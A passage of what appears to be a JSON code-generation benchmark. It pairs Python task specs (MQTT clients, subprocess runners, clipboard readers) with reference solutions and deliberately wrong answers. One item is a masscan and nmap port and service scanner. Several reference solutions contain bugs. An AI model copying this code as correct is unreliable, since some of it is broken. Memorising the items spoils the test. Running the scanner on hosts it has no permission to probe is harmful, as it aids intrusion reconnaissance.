    "Instruction": "Task Description: Create a Python class that implements an MQTT client for subscribing to topics and handling incoming messages, with support for custom command processing and authentication.\n\nClass Description: The MQTTClient class provides functionality to connect to an MQTT broker, subscribe to specified topics, and process incoming messages. It includes handlers for custom commands and button press events, with optional username/password authentication.\n\nAttributes:\n- host: str - The hostname or IP address of the MQTT broker\n- port: int - The port number of the MQTT broker\n- topic: str - The topic to subscribe to\n- username: str (optional) - Username for broker authentication\n- password: str (optional) - Password for broker authentication\n- client: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host: str, port: int, topic: str, username: str=None, password: str=None) -> None - Initializes the MQTT client with connection parameters\n- on_connect(client: mqtt.Client, userdata: Any, flags: dict, rc: int) -> None - Callback for when the client connects to the broker\n- on_message(client: mqtt.Client, userdata: Any, msg: mqtt.MQTTMessage) -> None - Callback for handling incoming messages\n- start() -> None - Starts the MQTT client connection and message loop\n- custom_command(command: str) -> None - Placeholder for handling custom commands\n- buttonsinglepress() -> None - Placeholder for handling button press events",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTClient:\n    def __init__(self, host, port, topic, username=None, password=None):\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n\n    def on_connect(self, client, userdata, flags, rc):\n        print(\"Connected with result code \"+str(rc))\n        client.subscribe(self.topic)\n\n    def on_message(self, client, userdata, msg):\n        print(\"Message from MQTT: \"+str(msg.payload.decode('utf-8')))\n        mqtt_query = str(msg.payload.decode('utf-8'))\n        if 'custom' in mqtt_query.lower():\n            mqtt_query = mqtt_query.lower()\n            mqtt_queryidx = mqtt_query.find('custom')\n            mqtt_query = mqtt_query[mqtt_queryidx:]\n            mqtt_query = mqtt_query.replace('custom',\"\",1)\n            mqtt_query = mqtt_query.strip()\n            self.custom_command(mqtt_query)\n        elif mqtt_query.lower() == 'mute':\n            self.buttonsinglepress()\n        else:\n            self.assistant.send_text_query(mqtt_query)\n\n    def start(self):\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n        self.client.connect(self.host, self.port, 60)\n        self.client.loop_forever()\n\n    def custom_command(self, command):\n        # Placeholder for custom command handling\n        pass\n\n    def buttonsinglepress(self):\n        # Placeholder for button press handling\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "class MQTTClient:\n    def __init__(self, host: str, port: int, topic: str, username: str = None, password: str = None):\n        import mqtt\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.connect(self.host, self.port)\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n\n    def on_connect(self, client, userdata, flags, rc):\n        print(f\"Connected with result code {rc}\")\n        client.subscribe(self.topic)\n\n    def on_message(self, client, userdata, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    def start(self):\n        self.client.loop_start()\n\n    def custom_command(self, command: str):\n        print(f\"Custom command received: {command}\")\n\n    def buttonsinglepress(self):\n        print(\"Button single press event detected\")"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Implement an MQTT subscriber client in Python using the Paho MQTT library to connect to a broker, subscribe to topics, and handle incoming messages.\n\nFunction Description: The function `mqtt_subscribe` establishes a connection to an MQTT broker, subscribes to specified topics, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, subscription acknowledgments, and incoming messages.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity, but could be parameterized for flexibility.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Create a Python class that encapsulates MQTT subscriber functionality using the Paho MQTT library, allowing for connection to a broker, topic subscription, and message handling.\n\nClass Description: The `MQTTSubscriber` class provides methods to connect to an MQTT broker, subscribe to topics, and process incoming messages. It uses callback methods to handle connection events, subscription acknowledgments, and message reception.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The MQTT client instance used for communication with the broker.\n- `broker_address`: [str] - The address of the MQTT broker to connect to.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The topic to subscribe to for receiving messages.\n\nMethods:\n\n- `__init__(self, broker_address: str, broker_port: int, topic: str) -> None` - Initializes the MQTT subscriber with broker details and subscription topic.\n- `on_connect(self, mqttc, obj, flags, reason_code, properties) -> None` - Callback for when the client connects to the broker.\n- `on_message(self, mqttc, obj, msg) -> None` - Callback for when a message is received on a subscribed topic.\n- `on_subscribe(self, mqttc, obj, mid, reason_code_list, properties) -> None` - Callback for when the client subscribes to a topic.\n- `connect_and_subscribe(self) -> None` - Connects to the broker and subscribes to the specified topic.\n- `start(self) -> None` - Starts the MQTT loop to process network traffic and messages.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \" + str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\ndef mqtt_subscribe():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\")\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "class MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str) -> None:\n        self.client = mqtt.Client()\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(\"Connected to broker\")\n        mqttc.subscribe(self.topic)\n\n    def on_message(self, mqttc, obj, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(f\"Subscribed to topic {self.topic} with mid {mid}\")\n\n    def connect_and_subscribe(self) -> None:\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.loop_start()\n\n    def start(self) -> None:\n        self.connect_and_subscribe()\n        try:\n            while True:\n                pass\n        except KeyboardInterrupt:\n            self.client.loop_stop()"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection to a broker, publishes messages to specified topics with a given QoS level, and handles connection and message events asynchronously.\n\nFunction Description: The function `mqtt_publish` initializes an MQTT client, sets up callback functions for connection, message reception, and message publishing events, connects to a specified MQTT broker, starts an asynchronous network loop, and publishes messages to designated topics with a QoS level of 2. The function demonstrates basic MQTT publishing capabilities with event handling.\n\nInput: None (The function uses hardcoded values for broker address, port, topics, and messages)\n\nOutput: None (The function's effects are side-effects: publishing messages and printing status information through callback functions)\n\nNote: The function includes three callback functions:\n1. `on_connect`: Prints the connection reason code when connected to the broker\n2. `on_message`: Prints received messages (though none are expected in this publish-only example)\n3. `on_publish`: Prints the message ID when a message is published",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \" + str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_publish(mqttc, obj, mid, reason_code, properties):\n    print(\"mid: \" + str(mid))\n\ndef mqtt_publish():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_publish = on_publish\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.loop_start()\n    (rc, mid) = mqttc.publish(\"tuple\", \"bar\", qos=2)\n    infot = mqttc.publish(\"class\", \"bar\", qos=2)\n    infot.wait_for_publish()",
    "Code_level": "Function-level",
    "FSMID_for_test": 83,
    "wrong_result": "import paho.mqtt.client as mqtt\nimport asyncio\n\ndef mqtt_publish():\n    # Callback when the client connects to the broker\n    def on_connect(client, userdata, flags, rc):\n        print(f\"Connected with result code {rc}\")\n        # Subscribe to a topic (for demonstration, though not used in this publish-only example)\n        client.subscribe(\"test/topic\")\n\n    # Callback when a message is received\n    def on_message(client, userdata, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    # Callback when a message is published\n    def on_publish(client, userdata, mid):\n        print(f\"Message published with ID: {mid}\")\n\n    # Create an MQTT client instance\n    client = mqtt.Client()\n    client.on_connect = on_connect\n    client.on_message = on_message\n    client.on_publish = on_publish\n\n    # Connect to the broker\n    client.connect(\"localhost\", 1883, 60)\n\n    # Publish messages to specified topics with QoS level 2\n    topics = [\"test/topic1\", \"test/topic2\"]\n    messages = [\"Message 1\", \"Message 2\"]\n\n    for topic, message in zip(topics, messages):\n        client.publish(topic, message, qos=2)\n\n    # Start the asynchronous event loop\n    asyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Python class that utilizes subprocess communication to perform network scanning operations using masscan and nmap tools for both TCP and UDP ports.\n\nClass Description: The SubprocessScanner class provides functionality to scan a target host for open TCP/UDP ports using masscan and then perform service detection on those ports using nmap. It handles subprocess communication and output parsing.\n\nAttributes:\nhost: str - The target host IP address or hostname to be scanned\n\nMethods:\nuseMasscanTCP() -> list - Scans the host for open TCP ports using masscan and returns a list of open port numbers\nuseMasscanUDP() -> list - Scans the host for open UDP ports using masscan and returns a list of open port numbers\nuseNmapServTCP(port: str) -> str - Performs service detection on the specified TCP port using nmap and returns the service information\nuseNmapServUDP(port: str) -> str - Performs service detection on the specified UDP port using nmap and returns the service information",
    "Canonical_solution": "import subprocess\nimport re\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-p21-25,53,80-90,99,110,113,119,121-123,137-139,\\\n                    170,443-445,456,554,513-514,559,873,888,1080-1099,1200-1212,1234,1243-1255,\\\n                    1433-1434,1521,2000,2049,2181,2200-2300,2375,2535,3127-3128,3300-3310,3389,\\\n                    4443-4444,5000-5001,5432,5900-5901,5432,5984,6000,6370-6380,6984,7000-7010,\\\n                    8000-8200,8443-8449,8880-8900,9000-9001,9043,9080-9100,9200-9210,9300,9668,\\\n                    9876,9990-10000,10080,11211,12345,16379,18080,20000-20010,22220-23000,26379,\\\n                    27010-27020,33060,50070', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/tcp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/tcp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useMasscanUDP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-pU:20-25,79,110,123,137-139,161,180,513-514,559,666,999,\\\n                    1011-1032,1042-1054,1200-1201,1342-1349,2000-2002,3333,6666,26274,26374,26444,26573,\\\n                    27184,27444,29589,29891,30103,31320-31340,34555,35555', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/udp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/udp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useNmapServTCP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n\n    def useNmapServUDP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "class SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        import subprocess\n        command = [\"masscan\", \"--rate=500\", \"--open\", self.host, \"-p1-65535\"]\n        result = subprocess.run(command, capture_output=True, text=True)\n        ports = []\n        for line in result.stdout.splitlines():\n            if \"open\" in line:\n                port = line.split()[2]\n                ports.append(int(port))\n        return ports\n\n    def useMasscanUDP(self):\n        import subprocess\n        command = [\"masscan\", \"--rate=500\", \"--open\", self.host, \"-p1-65535\", \"--udp\"]\n        result = subprocess.run(command, capture_output=True, text=True)\n        ports = []\n        for line in result.stdout.splitlines():\n            if \"open\" in line:\n                port = line.split()[2]\n                ports.append(int(port))\n        return ports\n\n    def useNmapServTCP(self, port):\n        import subprocess\n        command = [\"nmap\", \"-sV\", \"--hostmin\", str(port), self.host]\n        result = subprocess.run(command, capture_output=True, text=True)\n        return result.stdout\n\n    def useNmapServUDP(self, port):\n        import subprocess\n        command = [\"nmap\", \"-sU\", \"-sV\", \"--hostmin\", str(port), self.host]\n        result = subprocess.run(command, capture_output=True, text=True)\n        return result.stdout"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Implement a class that interacts with Alibaba Cloud's Flash Recognizer service to convert audio files into text with timing information using HTTP client functionality.\n\nClass Description: AliRecognitionService is a client for Alibaba Cloud's speech recognition API that processes audio files and returns recognition results with timestamps.\n\nAttributes:\nALI_ACCESS_AKID: str - Alibaba Cloud access key ID for authentication\nALI_ACCESS_AKKEY: str - Alibaba Cloud access key secret for authentication\nALI_APP_KEY: str - Application key for the recognition service\ntoken: str - Authentication token obtained using access credentials\nformat: str - Audio file format (default: \"wav\")\nsampleRate: int - Audio sample rate in Hz (default: 16000)\nurl: str - API endpoint URL for the recognition service\n\nMethods:\n__init__(access_key_id: str, access_key_secret: str, app_key: str) -> None - Initializes the recognition service with authentication credentials and application key\nprocess(audioFile: str) -> List[AliRecognitionResult] - Processes an audio file and returns a list of recognition results containing text with begin/end timestamps\n\nHelper Class:\nAliRecognitionResult: A data class to store recognition results with text and timing information\n__init__(text: str, begin_time: int, end_time: int) -> None - Initializes a recognition result with text and its timing information",
    "Canonical_solution": "import http.client\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text, begin_time, end_time):\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\nclass AliRecognitionService:\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = getToken(self.ALI_ACCESS_AKID, self.ALI_ACCESS_AKKEY)\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = 'https://nls-gateway-cn-shanghai.aliyuncs.com/stream/v1/FlashRecognizer'\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        result_list = []\n        request = self.url + '?appkey=' + self.ALI_APP_KEY\n        request = request + '&token=' + self.token\n        request = request + '&format=' + self.format\n        request = request + '&sample_rate=' + str(self.sampleRate)\n\n        with open(audioFile, mode='rb') as f:\n            audioContent = f.read()\n        \n        host = 'nls-gateway-cn-shanghai.aliyuncs.com'\n        httpHeaders = {'Content-Length': len(audioContent)}\n        \n        conn = http.client.HTTPSConnection(host)\n        conn.request(method='POST', url=request, body=audioContent, headers=httpHeaders)\n        response = conn.getresponse()\n        \n        body = response.read()\n        try:\n            body = json.loads(body)\n            status = body['status']\n            if status == 20000000:\n                result = body['flash_result']\n                if 'sentences' in result:\n                    for sentence in result['sentences']:\n                        result_list.append(\n                            AliRecognitionResult(sentence['text'], sentence['begin_time'], sentence['end_time']))\n        except ValueError:\n            print('The response is not json format string')\n        finally:\n            conn.close()\n        return result_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "from alibabacloud.exceptions import ClientException, ServerException\nimport requests\nimport json\nfrom dataclasses import dataclass\n\n@dataclass\nclass AliRecognitionResult:\n    text: str\n    begin_time: int\n    end_time: int\n\nclass AliRecognitionService:\n    ALI_ACCESS_AKID: str\n    ALI_ACCESS_AKKEY: str\n    ALI_APP_KEY: str\n    token: str\n    format: str\n    sampleRate: int\n    url: str\n\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str) -> None:\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = \"https://aip.bcebos.com/v1.0/recognize\"\n\n    def process(self, audioFile: str) -> list[AliRecognitionResult]:\n        headers = {\n            \"Content-Type\": \"audio/\" + self.format,\n            \"Authorization\": \"Bearer \" + self.token\n        }\n        with open(audioFile, \"rb\") as f:\n            audio_data = f.read()\n        response = requests.post(self.url, headers=headers, data=audio_data)\n        if response.status_code != 200:\n            raise Exception(f\"Failed to process audio: {response.text}\")\n        result = response.json()\n        recognition_results = []\n        for item in result.get(\"result\", []):\n            text = item.get(\"text\", \"\")\n            begin_time = item.get(\"start_time\", 0)\n            end_time = item.get(\"end_time\", 0)\n            recognition_results.append(AliRecognitionResult(text, begin_time, end_time))\n        return recognition_results"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a function to execute system commands and handle input/output communication between processes using pipes.\n\nFunction Description: The function `runCmd` executes a system command in a subprocess and facilitates communication via pipes. It can handle both cases where input data is provided to the subprocess and where no input is required. The function captures the standard output, standard error, and return code of the executed command.\n\nInput:\n- `cmd`: [List or String] - The command to be executed, either as a list of arguments or a single string.\n- `data`: [Bytes, optional] - Input data to be sent to the subprocess's standard input. Defaults to None if no input is required.\n\nOutput:\n- A tuple containing:\n  - `stdout`: [String] - The decoded standard output of the command.\n  - `stderr`: [String] - The decoded standard error of the command.\n  - `returncode`: [Integer] - The return code of the executed command.",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef runCmd(cmd, data=None):\n    if input is None:\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n    else:\n        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate(input=data)\n\n    return stdout.decode('utf-8'), stderr.decode('utf-8'), p.returncode",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef runCmd(cmd, data=None):\n    if isinstance(cmd, str):\n        cmd = [cmd]\n    proc = subprocess.Popen(\n        cmd,\n        stdin=subprocess.PIPE if data else None,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        universal_newlines=True\n    )\n    if data:\n        stdout, stderr = proc.communicate(data)\n    else:\n        stdout, stderr = proc.communicate()\n    returncode = proc.wait()\n    return (stdout, stderr, returncode)"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a function that executes a command in a subprocess using Python's subprocess module, capturing and returning the output and error streams along with the return code.\n\nFunction Description: The function `runvol` executes a given command (constructed from Python interpreter path, volatility script path, and additional arguments) as a subprocess. It captures the standard output, standard error, and return code of the subprocess, then returns these values after printing them for debugging purposes.\n\nInput:\n- `args`: [List[str]] - Additional command-line arguments to pass to the volatility script\n- `volatility`: [str] - Path to the volatility script to be executed\n- `python`: [str] - Path to the Python interpreter to use for execution\n\nOutput:\n- Returns a tuple containing:\n  - `returncode`: [int] - The exit code of the subprocess\n  - `stdout`: [bytes] - The standard output of the subprocess\n  - `stderr`: [bytes] - The standard error of the subprocess",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef runvol(args, volatility, python):\n    volpy = volatility\n    python_cmd = python\n\n    cmd = [python_cmd, volpy] + args\n    print(\" \".join(cmd))\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = p.communicate()\n    print(\"stdout:\")\n    sys.stdout.write(str(stdout))\n    print(\"\")\n    print(\"stderr:\")\n    sys.stdout.write(str(stderr))\n    print(\"\")\n\n    return p.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "def runvol(args, volatility, python):\n    command = [python, volatility] + args\n    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    returncode = process.returncode\n    print(f\"Return code: {returncode}\")\n    print(f\"Standard output:\\n{stdout.decode()}\")\n    print(f\"Standard error:\\n{stderr.decode()}\")\n    return (returncode, stdout, stderr)"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that executes a command-line process (specifically 'exodus') with given arguments and options, handling input/output through pipes, and returning the process's exit code and output streams.\n\nFunction Description: The function `run_exodus` launches an external 'exodus' process with specified arguments and options. It manages inter-process communication using pipes for stdin, stdout, and stderr. The function supports optional stdin input and returns the process's exit code along with captured stdout and stderr outputs.\n\nInput:\n- `args`: [List[str]] - Command-line arguments to pass to the 'exodus' process\n- `**options`: [Dict] - Additional subprocess.Popen options, including:\n  - `stdin`: [str, optional] - Input content to pipe into the process's stdin (encoded as UTF-8)\n  - `universal_newlines`: [bool, optional] - Flag to handle text streams (default: True)\n\nOutput:\n- Tuple containing:\n  - `returncode`: [int] - Exit status of the process\n  - `stdout`: [str] - Captured standard output\n  - `stderr`: [str] - Captured standard error",
    "Canonical_solution": "import os\nimport subprocess\n\ndef run_exodus(args, **options):\n    options['universal_newlines'] = options.get('universal_newlines', True)\n\n    # Allow specifying content to pipe into stdin, with options['stdin']\n    if 'stdin' in options:\n        input = options['stdin'].encode('utf-8')\n        options['stdin'] = subprocess.PIPE\n    else:\n        input = None\n\n    process = subprocess.Popen(\n        ['exodus'] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)\n    stdout, stderr = process.communicate(input=input)\n    return process.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_exodus(args, **options):\n    stdin = options.get('stdin')\n    universal_newlines = options.get('universal_newlines', True)\n    \n    process = subprocess.Popen(\n        args,\n        stdin=subprocess.PIPE if stdin else None,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        universal_newlines=universal_newlines,\n        **options\n    )\n    \n    if stdin:\n        stdout, stderr = process.communicate(stdin)\n    else:\n        stdout, stderr = process.communicate()\n    \n    returncode = process.wait()\n    return (returncode, stdout, stderr)"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Implement functions to execute system commands and manage subprocesses in Python, allowing for both simple command execution and more controlled process management with input/output handling.\n\nFunction Description: The module provides two main functions for subprocess management: `execute()` for running commands with comprehensive output handling, and `popen()` for creating Popen objects with predefined pipe configurations.\n\nInput:\n- For `execute()`:\n  - cmd: [string/list] - Command to execute (as string or argument list)\n  - shell: [bool, optional] - Whether to use shell execution (default False)\n  - poll_period: [float, optional] - Unused in current implementation\n  - catch_out: [bool, optional] - Whether to capture output (default False)\n  - executable: [string, optional] - Path to executable to use\n  - env: [dict, optional] - Environment variables for subprocess\n\n- For `popen()`:\n  - cmnd: [string] - Command string to execute\n\nOutput:\n- For `execute()`:\n  - Returns tuple: (returncode: int, stdout: bytes/str, stderr: bytes/str)\n  \n- For `popen()`:\n  - Returns: subprocess.Popen object configured with pipes for all streams",
    "Canonical_solution": "import subprocess\nimport shlex\nimport logging\nfrom six import string_types\n\ndef execute(cmd, shell=False, poll_period=1.0, catch_out=False, executable=None, env=None):\n    log = logging.getLogger(__name__)\n    log.info(\"Starting: %s\", cmd)\n\n    stdout = \"\"\n    stderr = \"\"\n\n    if not shell and isinstance(cmd, string_types):\n        cmd = shlex.split(cmd)\n    if not executable:\n        executable = None\n\n    if catch_out:\n        process = subprocess.Popen(\n            cmd,\n            shell=shell,\n            stderr=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            close_fds=True,\n            env=env,\n            executable=executable,\n        )\n    else:\n        process = subprocess.Popen(cmd, shell=shell, close_fds=True, env=env, executable=executable)\n\n    stdout, stderr = process.communicate()\n    if stderr:\n        log.error(\"There were errors:\\n%s\", stderr)\n\n    if stdout:\n        log.debug(\"Process output:\\n%s\", stdout)\n    returncode = process.returncode\n    log.info(\"Process cmd: %s \u2013 exit code: %s\", cmd, returncode)\n    return returncode, stdout, stderr\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        bufsize=0,\n        close_fds=True,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef execute(cmd, shell=False, poll_period=None, catch_out=False, executable=None, env=None):\n    if isinstance(cmd, list):\n        cmd = ' '.join(cmd)\n    proc = subprocess.Popen(\n        cmd,\n        shell=shell,\n        executable=executable,\n        env=env,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )\n    stdout, stderr = proc.communicate()\n    return (proc.returncode, stdout.decode('utf-8'), stderr.decode('utf-8'))\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE\n    )"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement functions to retrieve clipboard text content on different operating systems using subprocess pipes for inter-process communication.\n\nFunction Description: The functions use system clipboard utilities through subprocess pipes to get text content from the clipboard, handling platform-specific requirements and text encoding conversions.\n\nInput: None (both functions operate on system clipboard content)\n\nOutput: \n- osx_clipboard_get: Returns str - The decoded text content from macOS clipboard with line endings normalized\n- wayland_clipboard_get: Returns str - The decoded text content from Wayland clipboard, or raises exceptions for non-Wayland environments or missing dependencies\n\nMethods:\n1. osx_clipboard_get() -> str - Retrieves clipboard text on macOS using pbpaste command, converts line endings, and decodes the output\n2. wayland_clipboard_get() -> str - Retrieves clipboard text on Wayland using wl-paste command, with environment checks and error handling",
    "Canonical_solution": "import os\nimport subprocess\nimport IPython.utils.py3compat as py3compat\n\ndef osx_clipboard_get() -> str:\n    \"\"\" Get the clipboard's text on OS X.\n    \"\"\"\n    p = subprocess.Popen(['pbpaste', '-Prefer', 'ascii'],\n        stdout=subprocess.PIPE)\n    bytes_, stderr = p.communicate()\n    # Text comes in with old Mac \\r line endings. Change them to \\n.\n    bytes_ = bytes_.replace(b'\\r', b'\\n')\n    text = py3compat.decode(bytes_)\n    return text\n\ndef wayland_clipboard_get():\n    \"\"\"Get the clipboard's text under Wayland using wl-paste command.\n\n    This requires Wayland and wl-clipboard installed and running.\n    \"\"\"\n    if os.environ.get(\"XDG_SESSION_TYPE\") != \"wayland\":\n        raise TryNext(\"wayland is not detected\")\n\n    try:\n        with subprocess.Popen([\"wl-paste\"], stdout=subprocess.PIPE) as p:\n            raw, err = p.communicate()\n            if p.wait():\n                raise TryNext(err)\n    except FileNotFoundError as e:\n        raise TryNext(\n            \"Getting text from the clipboard under Wayland requires the wl-clipboard \"\n            \"extension: https://github.com/bugaevc/wl-clipboard\"\n        ) from e\n\n    if not raw:\n        raise ClipboardEmpty\n\n    try:\n        text = py3compat.decode(raw)\n    except UnicodeDecodeError as e:\n        raise ClipboardEmpty from e\n\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport sys\nimport os\n\ndef osx_clipboard_get() -> str:\n    try:\n        result = subprocess.run(['pbpaste'], capture_output=True, text=True, check=True)\n        return result.stdout.rstrip('\\r\\n')\n    except subprocess.CalledProcessError as e:\n        raise RuntimeError(\"Failed to retrieve clipboard content on macOS\") from e\n    except FileNotFoundError:\n        raise RuntimeError(\"pbpaste command not found. Ensure pbutil is installed.\") from None\n\ndef wayland_clipboard_get() -> str:\n    if 'WAYLAND_DISPLAY' not in os.environ:\n        raise RuntimeError(\"Wayland display environment variable not set.\")\n    try:\n        result = subprocess.run(['wl-paste'], capture_output=True, text=True, check=True)\n        return result.stdout.rstrip('\\r\\n')\n    except subprocess.CalledProcessError as e:\n        raise RuntimeError(\"Failed to retrieve clipboard content on Wayland\") from e\n    except FileNotFoundError:\n        raise RuntimeError(\"wl-paste command not found. Ensure wl-paste is installed.\") from None"
  },
